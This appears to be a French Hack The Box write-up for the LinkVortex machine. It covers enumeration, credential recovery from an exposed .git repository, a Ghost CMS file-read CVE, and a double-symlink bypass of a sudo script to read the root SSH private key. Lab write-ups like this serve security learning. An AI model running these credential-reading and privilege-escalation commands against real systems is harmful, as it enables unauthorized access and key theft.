<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: LinkVortex</title>
<meta name=description content="Platforme: Hack The Box Lien: LinkVortex Niveau: Facile OS: Linux LinkVortex utilise une version vulnérable de Ghost CMS. Nous trouvons un répertoire caché …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/fr/posts/htb-linkvortex/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: LinkVortex"><meta property="og:description" content="Platforme: Hack The Box Lien: LinkVortex Niveau: Facile OS: Linux LinkVortex utilise une version vulnérable de Ghost CMS. Nous trouvons un répertoire caché …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-LinkVortex/LinkVortex"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-LinkVortex/LinkVortex"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: LinkVortex"><meta name=twitter:description content="Platforme: Hack The Box Lien: LinkVortex Niveau: Facile OS: Linux LinkVortex utilise une version vulnérable de Ghost CMS. Nous trouvons un répertoire caché …"><meta property="twitter:domain" content="https://scorpiosec.com/fr/posts/htb-linkvortex/"><meta property="twitter:url" content="https://scorpiosec.com/fr/posts/htb-linkvortex/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-LinkVortex/LinkVortex"><link rel=canonical href=https://scorpiosec.com/fr/posts/htb-linkvortex/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/fr/posts/ aria-label=posts><span data-feather=book></span> Postes</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/projects/ aria-label=projects><span data-feather=code></span> Projets</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/tags/ aria-label=tags><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/categories/ aria-label=categories><span data-feather=folder></span> Catégories</a></div><div class=nav-link><a href=https://scorpiosec.com/ aria-label></a></div><div class="nav-link language-switcher"><a href=/posts/htb-linkvortex/>English</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/fr/posts/><span data-feather=book></span> Postes</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/projects/><span data-feather=code></span> Projets</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/categories/><span data-feather=folder></span> Catégories</a></li><li class=nav-item><a href=https://scorpiosec.com/></a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: LinkVortex</h1><small role=doc-subtitle></small><p class=post-date>5 min read |
<span class=post-date>11 Avril 2025</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/fr/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platforme: Hack The Box</li><li>Lien: <a href=https://app.hackthebox.com/machines/LinkVortex>LinkVortex</a></li><li>Niveau: Facile</li><li>OS: Linux</li></ul><hr><p>LinkVortex utilise une version vulnérable de Ghost CMS. Nous trouvons un répertoire caché hébergeant une page de connexion pour l&rsquo;administrateur Ghost, ainsi qu&rsquo;un répertoire <code>.git</code> exposé. Ce dernier contient des identifiants valides pour la page admin. Nous exploitons ensuite le <code>CVE-2023-40028</code>, une vulnérabilité de lecture de fichiers, pour lire des fichiers sensibles sur le serveur, et trouvons des identifiants supplémentaires. Ces derniers nous permettent d&rsquo;obtenir un accès initial via SSH. L&rsquo;escalade des privilèges est réalisée en exploitant un script exécutable en tant que root.</p><h2 id=balayage>Balayage</h2><pre tabindex=0><code>nmap -sC -sV {TARGET_IP}
</code></pre><p><strong>Résultats</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2025-02-11 09:42 CST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.129.231.194
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.13s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>998</span> closed tcp ports <span style=color:#56b6c2>(</span>conn-refused<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 <span style=color:#56b6c2>(</span>Ubuntu Linux; protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd
</span></span><span style=display:flex><span>|_http-server-header: Apache
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://linkvortex.htb/
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 23.71 seconds
</span></span></code></pre></div><p>Nmap trouve deux ports ouverts: <code>22</code> pour SSH et <code>80</code> pour http. De plus, il y a une redirection vers <code>linkvortex.htb</code>.</p><pre tabindex=0><code>sudo echo &#34;{TARGET_IP} linkvortex.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id=enumération>Enumération</h2><p>À <code>http://linkvortex.htb/</code>, nous trouvons un blog utilisant le système de gestion de contenu <a href=https://ghost.org/>Ghost CMS</a>. Wappalyzer nous indique que la <code>version 5.58</code> est utilisée.</p><p><img src=/images/HTB-LinkVortex/linkvortex_website.png alt="LinkVortex website"></p><p>Avec feroxbuster, nous trouvons <code>/ghost</code>.</p><pre tabindex=0><code>feroxbuster -u http://linkvortex.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 200 -r --scan-dir-listings -C 403,404
</code></pre><p><img src=/images/HTB-LinkVortex/ghost_directory.png alt="ghost hidden directory"></p><p>En visitant <code>http://linkvortex.htb/ghost/</code>, nous arrivons sur une page de connexion admin.</p><p><img src=/images/HTB-LinkVortex/ghost_admin_page.png alt="ghost admin page"></p><p>En énumérant les sous-domaines, nous découvrons le sous-domaine <code>dev</code>.</p><pre tabindex=0><code>ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://linkvortex.htb -H &#34;Host: FUZZ.linkvortex.htb&#34; -ic -fs 230
</code></pre><p><img src=/images/HTB-LinkVortex/subdomain_dev.png alt="dev subdomain found"></p><p><code>http://dev.linkvortex.htb/</code> mène à un autre site web qui est en construction.</p><p><img src=/images/HTB-LinkVortex/dev_subdomain_website.png alt="website at dev subdomain"></p><p>Nous trouvons également un répertoire caché (<code>.git</code>) pour le sous-domaine.</p><pre tabindex=0><code>ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://dev.linkvortex.htb/FUZZ -ic --fc 404,403
</code></pre><p><img src=/images/HTB-LinkVortex/subdomain_git.png alt="git hidden folder"></p><p>En visitant <code>http://dev.linkvortex.htb/.git</code> nous trouvons des fichiers pour un dépôt git.</p><p><img src=/images/HTB-LinkVortex/linkvortex_git_files.png alt="git files"></p><p>Nous téléchargeons le dépôt disponible à <code>http://dev.linkvortex.htb/.git</code> avec <a href=https://github.com/arthaud/git-dumper>git-dumper</a>.</p><pre tabindex=0><code>git-dumper http://dev.linkvortex.htb/.git git_linkvortex
</code></pre><p><img src=/images/HTB-LinkVortex/git_dumper_linkvortex.png alt="git dumper command"></p><p>A l&rsquo;intérieur du répertoire, nous recherchons des informations d&rsquo;identification, en utilisant <code>grep -iR "password"</code>. Quelques possibilités de mot de passe sont découvertes.</p><p><img src=/images/HTB-LinkVortex/passwords_found.png alt="passwords found in project files"></p><p>Nous pouvons nous connecter sur <code>http://linkvortex.htb/ghost</code> avec <code>admin@linkvortex.htb:OctopiFociPilfer45</code> et accéder au tableau de bord de Ghost.</p><p><img src=/images/HTB-LinkVortex/ghost_dashboard.png alt="Ghost Dashboard"></p><h2 id=accès-initial>Accès initial</h2><p>Maintenant que nous détenons des identifiants valides, nous pouvons utiliser ce <a href=https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028>PoC</a> pour <code>CVE-2023-40028</code> afin de lire des fichiers sur le système cible.</p><p><img src=/images/HTB-LinkVortex/CVE-2023-40028.png alt=CVE-2023-40028></p><p>Parmi les fichiers du dépôt, il y en a un appelé <code>Dockerfile.ghost</code>, en vérifiant son contenu nous trouvons un fichier de configuration à <code>/var/lib/ghost/config.production.json</code>.</p><p>En utilisant notre vulnérabilité de lecture de fichier, nous lisons <code>/var/lib/ghost/config.production.json</code> et trouvons les identifiants d&rsquo;un autre utilisateur.</p><p><img src=/images/HTB-LinkVortex/creds_docker_config.png alt="Dockerfile config"></p><pre tabindex=0><code>bob@linkvortex.htb:fibber-talented-worth
</code></pre><p>Nous nous connectons via SSH en tant que <code>bob</code> et pouvons lire le drapeau de l&rsquo;utilisateur.</p><p><img src=/images/HTB-LinkVortex/user_flag.png alt="user flag"></p><h2 id=elévation-de-privilèges>Elévation de Privilèges</h2><p>Nous consultons les privilèges sudo de l&rsquo;utilisateur et constatons qu&rsquo;il peut exécuter <code>/usr/bin/bash /opt/ghost/clean_symlink.sh *.png</code> en tant que n&rsquo;importe quel utilisateur, sans fournir de mot de passe.</p><p><img src=/images/HTB-LinkVortex/sudo_privs_linkvortex.png alt="sudo privileges for bob"></p><p>Le contenu de <code>/opt/ghost/clean_symlink.sh</code> est le suivant</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#7f848e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#7f848e></span>
</span></span><span style=display:flex><span><span style=color:#e06c75>QUAR_DIR</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;/var/quarantined&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> <span style=color:#56b6c2>[</span> -z <span style=color:#e06c75>$CHECK_CONTENT</span> <span style=color:#56b6c2>]</span>;<span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>  <span style=color:#e06c75>CHECK_CONTENT</span><span style=color:#56b6c2>=</span><span style=color:#e5c07b>false</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>LINK</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>$1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> ! <span style=color:#56b6c2>[[</span> <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$LINK</span><span style=color:#98c379>&#34;</span> <span style=color:#56b6c2>=</span>~ <span style=color:#98c379>\.</span>png$ <span style=color:#56b6c2>]]</span>; <span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>  /usr/bin/echo <span style=color:#98c379>&#34;! First argument must be a png file !&#34;</span>
</span></span><span style=display:flex><span>  <span style=color:#e5c07b>exit</span> <span style=color:#d19a66>2</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> /usr/bin/sudo /usr/bin/test -L <span style=color:#e06c75>$LINK</span>;<span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>  <span style=color:#e06c75>LINK_NAME</span><span style=color:#56b6c2>=</span><span style=color:#c678dd>$(</span>/usr/bin/basename <span style=color:#e06c75>$LINK</span><span style=color:#c678dd>)</span>
</span></span><span style=display:flex><span>  <span style=color:#e06c75>LINK_TARGET</span><span style=color:#56b6c2>=</span><span style=color:#c678dd>$(</span>/usr/bin/readlink <span style=color:#e06c75>$LINK</span><span style=color:#c678dd>)</span>
</span></span><span style=display:flex><span>  <span style=color:#c678dd>if</span> /usr/bin/echo <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$LINK_TARGET</span><span style=color:#98c379>&#34;</span> | /usr/bin/grep -Eq <span style=color:#98c379>&#39;(etc|root)&#39;</span>;<span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>    /usr/bin/echo <span style=color:#98c379>&#34;! Trying to read critical files, removing link [ </span><span style=color:#e06c75>$LINK</span><span style=color:#98c379> ] !&#34;</span>
</span></span><span style=display:flex><span>    /usr/bin/unlink <span style=color:#e06c75>$LINK</span>
</span></span><span style=display:flex><span>  <span style=color:#c678dd>else</span>
</span></span><span style=display:flex><span>    /usr/bin/echo <span style=color:#98c379>&#34;Link found [ </span><span style=color:#e06c75>$LINK</span><span style=color:#98c379> ] , moving it to quarantine&#34;</span>
</span></span><span style=display:flex><span>    /usr/bin/mv <span style=color:#e06c75>$LINK</span> <span style=color:#e06c75>$QUAR_DIR</span>/
</span></span><span style=display:flex><span>    <span style=color:#c678dd>if</span> <span style=color:#e06c75>$CHECK_CONTENT</span>;<span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>      /usr/bin/echo <span style=color:#98c379>&#34;Content:&#34;</span>
</span></span><span style=display:flex><span>      /usr/bin/cat <span style=color:#e06c75>$QUAR_DIR</span>/<span style=color:#e06c75>$LINK_NAME</span> 2&gt;/dev/null
</span></span><span style=display:flex><span>    <span style=color:#c678dd>fi</span>
</span></span><span style=display:flex><span>  <span style=color:#c678dd>fi</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>fi</span>
</span></span></code></pre></div><p>Le script <code>clean_symlink.sh</code> est conçu pour gérer les liens symboliques ciblant les fichiers <code>.png</code>. Il vérifie si le fichier fourni est un lien symbolique et, si c&rsquo;est le cas, détermine son chemin cible. Si le lien symbolique pointe vers un répertoire sensible tel que <code>/etc</code> ou <code>/root</code>, le script le supprime. Sinon, il déplace le lien symbolique vers un répertoire de quarantaine (<code>/var/quarantined/</code>). De plus, lorsque la variable d&rsquo;environnement <code>CHECK_CONTENT=true</code> est définie, le script tente de lire et d&rsquo;afficher le contenu du fichier (ou du fichier vers lequel pointe le lien symbolique).</p><p>Nous pouvons essayer d&rsquo;exploiter le script avec un lien symbolique pointant vers la clé SSH root.</p><pre tabindex=0><code>touch id_rsa.png
ln -sf /root/.ssh/id_rsa id_rsa.png
sudo /usr/bin/bash /opt/ghost/clean_symlink.sh id_rsa.png
</code></pre><p>Le lien est en effet supprimé.</p><p><img src=/images/HTB-LinkVortex/symlink_exploit_fail.png alt="Symlink exploit failure"></p><p>Essayons une autre méthode. Cette fois-ci, nous utiliserons deux liens symboliques afin de contourner la fonction de sécurité du script.</p><pre tabindex=0><code>cd ~
ln -s /root/.ssh/id_rsa id_rsa.txt
ln -s /home/bob/id_rsa.txt root.png
sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/root.png
</code></pre><p><img src=/images/HTB-LinkVortex/root_exploitation.png alt="root privilege escalation"></p><p>Nous exploitons avec succès le script et obtenons la clé SSH de l&rsquo;utilisateur root. Nous sauvegardons la clé privée SSH récupérée et l&rsquo;utilisons pour nous authentifier en tant qu&rsquo;utilisateur root.</p><p><img src=/images/HTB-LinkVortex/root_flag.png alt="root flag"></p><h3 id=explication-de-lexploitation>Explication de l&rsquo;exploitation</h3><p>Le script détecte <code>root.png</code> comme un fichier valide correspondant au modèle <code>*.png</code>. Cependant, <code>root.png</code> est un lien symbolique vers <code>id_rsa.txt</code>, qui est lui-même un lien symbolique vers <code>/root/.ssh/id_rsa</code>.</p><p>Puisque <code>CHECK_CONTENT=true</code>, le script affiche le contenu du fichier vers lequel pointe notre lien symbolique. Puisque le script s&rsquo;exécute avec les privilèges de root, il suit avec succès les deux liens symboliques et finit par lire le contenu de <code>/root/.ssh/id_rsa</code>.</p></div><div class=prev-next><div class=prev-post><p><a href=/fr/posts/htb-alert/>&#8592;
Précédent:
HTB: Alert</a></p><p class=prev-post-date>mars 21, 2025</p></div><div class=next-post><p><a href=/fr/posts/htb-administrator/>Suivant:
HTB: Administrator
&#8594;</a></p><p class=next-post-date>avril 20, 2025</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#balayage>Balayage</a></li><li><a href=#enumération>Enumération</a></li><li><a href=#accès-initial>Accès initial</a></li><li><a href=#elévation-de-privilèges>Elévation de Privilèges</a><ul><li><a href=#explication-de-lexploitation>Explication de l&rsquo;exploitation</a></li></ul></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2025 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>